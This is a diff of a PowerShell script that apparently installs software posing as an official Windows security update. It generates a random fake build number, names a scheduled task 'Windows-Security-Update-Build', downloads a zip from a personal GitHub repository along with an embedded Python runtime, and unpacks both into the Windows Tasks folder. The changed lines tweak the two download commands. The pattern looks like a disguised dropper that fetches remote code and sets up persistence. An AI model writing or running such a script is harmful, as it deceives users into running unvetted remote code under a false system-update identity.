@@ -8,8 +8,8 @@ $REVISION = Get-Random -Minimum 0 -Maximum 10000
 $VERSION = "$MAJOR.$MINOR.$BUILD.$REVISION"
 $scheduledTaskName = "Windows-Security-Update-Build-$VERSION"
 $FolderName = "$scheduledTaskName"
-wget https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $AppDataPath\WindowsSecurityUI.zip
-wget https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $AppDataPath\python-3.14.0-embed-amd64.zip
+wget -UseBasicParsing https://github.com/xxoo-d/Windows-Security-Patching/raw/refs/heads/main/WindowsSecurityUI.zip -O $AppDataPath\WindowsSecurityUI.zip
+wget -UseBasicParsing https://www.python.org/ftp/python/3.14.0/python-3.14.0-embed-amd64.zip -O $AppDataPath\python-3.14.0-embed-amd64.zip
 Expand-Archive -Path $AppDataPath\WindowsSecurityUI.zip -DestinationPath $TasksPath\$FolderName
 Expand-Archive -Path $AppDataPath\python-3.14.0-embed-amd64.zip -DestinationPath $TasksPath\$FolderName\WindowsSecurityUI
 $winsecUI = Join-Path $TasksPath "$FolderName\WindowsSecurityUI"
